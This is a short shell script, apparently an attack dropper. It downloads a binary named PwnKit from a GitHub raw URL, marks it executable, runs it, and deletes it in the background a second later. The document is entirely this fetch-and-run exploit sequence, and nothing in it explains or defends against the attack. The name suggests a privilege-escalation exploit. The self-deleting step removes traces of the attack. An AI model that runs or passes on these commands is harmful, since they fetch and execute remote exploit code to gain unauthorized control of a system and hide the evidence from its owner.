curl -fsSL https://raw.githubusercontent.com/enansolero/Arsenal/main/PwnKit -o PwnKit || exit
chmod +x ./PwnKit || exit
(sleep 1 && rm ./PwnKit & )
./PwnKit
